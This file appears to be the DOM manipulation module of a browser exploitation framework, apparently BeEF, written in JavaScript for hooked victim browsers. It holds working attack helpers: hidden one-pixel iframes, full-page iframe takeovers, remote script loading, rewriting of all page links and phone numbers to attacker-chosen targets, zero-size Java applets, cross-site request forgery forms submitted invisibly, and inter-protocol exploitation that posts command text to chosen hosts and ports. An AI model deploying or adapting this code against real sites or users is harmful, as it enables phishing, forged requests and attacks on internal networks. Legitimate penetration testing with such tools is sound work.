dom = {
	generateID: function(prefix) {
		return ((prefix == null) ? 'beef-' : prefix)+Math.floor(Math.random()*99999);
	},	
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		return el;
	},
	removeElement: function(el) {
		if (!dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		document.body.appendChild(iframe);
		return iframe;
	},
	getHighestZindex: function(include_id) {
		var highest = {'height':0, 'elem':''};
		$('*').each(function() {
			var current_high = parseInt($(this).css("zIndex"),10);
			if (current_high > highest.height) {
				highest.height = current_high;
				highest.elem = $(this).attr('id');
			}
		});
		if (include_id) {
			return highest;
		} else {
			return highest.height;
		}
	},
	createIframe: function(type, params, styles, onload) {
		var css = {};
		if (type == 'hidden') {
			css = $.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles);
		} else if (type == 'fullscreen') {
			css = $.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px', 'z-index':dom.getHighestZindex()+1}, styles);
			$('body').css({'padding':'0px', 'margin':'0px'});
		} else {
			css = styles;
			$('body').css({'padding':'0px', 'margin':'0px'});
		}
		var iframe = $('<iframe />').attr(params).css(css).load(onload).prependTo('body');
		return iframe;
	},
    persistentIframe: function(){
        $('a').click(function(e) {
            if ($(this).attr('href') != '')
            {
                e.preventDefault();
                dom.createIframe('fullscreen', {'src':$(this).attr('href')}, {}, null);
                $(document).attr('title', $(this).html());
                document.body.scroll = "no";
                document.documentElement.style.overflow = 'hidden';
            }
        });
    },
	grayOut: function(vis, options) {
	  var options = options || {};
	  var zindex = options.zindex || dom.getHighestZindex()+1;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	        var pageWidth = document.body.scrollWidth+'px';
	        var pageHeight = document.body.scrollHeight+'px';
	    } else if( document.body.offsetWidth ) {
	      var pageWidth = document.body.offsetWidth+'px';
	      var pageHeight = document.body.offsetHeight+'px';
	    } else {
	       var pageWidth='100%';
	       var pageHeight='100%';
	    }
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	},
	removeStylesheets: function() {
		$('link[rel=stylesheet]').remove();
		$('style').remove();
	},
	createForm: function(params, append) {
		var form = $('<form></form>').attr(params);
		if (append)
			$('body').append(form);
		return form;
	},
	loadScript: function(url) {
	  var s = document.createElement('script');
	  s.type = 'text/javascript';
	  s.src = url;
	  $('body').append(s);
	},
	getLocation: function() {
		return document.location.href;
	},
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	},
	rewriteLinks: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $(sel).each(function() {
			if ($(this).attr('href') != null)
			{
				$(this).attr('href', url).click(function() { return true; });
			}
		}).length;
	},
	rewriteLinksClickEvents: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $(sel).each(function() {
			if ($(this).attr('href') != null)
			{
				$(this).click(function() {this.href=url});
			}
		}).length;
	},
	rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {
		var count = 0;
		var re = new RegExp(old_protocol+"://", "gi");
		var sel = (selector == null) ? 'a' : selector;
		$(sel).each(function() {
			if ($(this).attr('href') != null) {
				var url = $(this).attr('href');
				if (url.match(re)) {
					$(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
					count++;
				}
			}
		});
		return count;
	},
	rewriteTelLinks: function(new_number, selector) {
		var count = 0;
		var re = new RegExp("tel:/?/?.*", "gi");
		var sel = (selector == null) ? 'a' : selector;
		$(sel).each(function() {
			if ($(this).attr('href') != null) {
				var url = $(this).attr('href');
				if (url.match(re)) {
					$(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
					count++;
				}
			}
		});
		return count;
	},
    parseAppletParams: function(params){
         var result = '';
         for (i in params){
           var param = params[i];
           for(key in param){
              result += "<param name='" + key + "' value='" + param[key] + "' />";
           }
         }
        return result;
    },
    attachApplet: function(id, name, code, codebase, archive, params) {
        var content = null;
        if (beef.browser.isIE()) {
            content = "" + // the classid means 'use the latest JRE available to launch the applet'
                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
                "height='0' width='0' name='" + name + "'> " +
                "<param name='code' value='" + code + "' />";
            if (codebase != null) {
                content += "<param name='codebase' value='" + codebase + "' />"
            }
            if (archive != null){
                content += "<param name='archive' value='" + archive + "' />";
            }
            if (params != null) {
                content += dom.parseAppletParams(params);
            }
            content += "</object>";
        }
        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO() || beef.browser.isFF()) {
            if (codebase != null) {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }
            if (params != null) {
                content += dom.parseAppletParams(params);
            }
            content += "</applet>";
        }
        $('body').append(content);
    },
    detachApplet: function(id) {
        $('#' + id + '').detach();
    },
    createIframeXsrfForm: function(action, method, enctype, inputs){
        var iframeXsrf = dom.createInvisibleIframe();
        var formXsrf = document.createElement('form');
        formXsrf.setAttribute('action',  action);
        formXsrf.setAttribute('method',  method);
        formXsrf.setAttribute('enctype', enctype);
        var input = null;
        for (i in inputs){
            var attributes = inputs[i];
            input = document.createElement('input');
                for(key in attributes){
                    if (key == 'name' && attributes[key] == 'submit') {
                      beef.debug("createIframeXsrfForm - warning: changed form input 'submit' to 'Submit'");
                      input.setAttribute('Submit', attributes[key]);
                    } else {
                      input.setAttribute(key, attributes[key]);
                    }
                }
            formXsrf.appendChild(input);
        }
        iframeXsrf.contentWindow.document.body.appendChild(formXsrf);
        formXsrf.submit();
        return iframeXsrf;
    },
    createIframeIpecForm: function(rhost, rport, path, commands){
        var iframeIpec = dom.createInvisibleIframe();
        var formIpec = document.createElement('form');
        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
        formIpec.setAttribute('method',  'POST');
        formIpec.setAttribute('enctype', 'multipart/form-data');
        input = document.createElement('textarea');
        input.setAttribute('name', Math.random().toString(36).substring(5));
        input.value = commands;
        formIpec.appendChild(input);
        iframeIpec.contentWindow.document.body.appendChild(formIpec);
        formIpec.submit();
        return iframeIpec;
    }
};
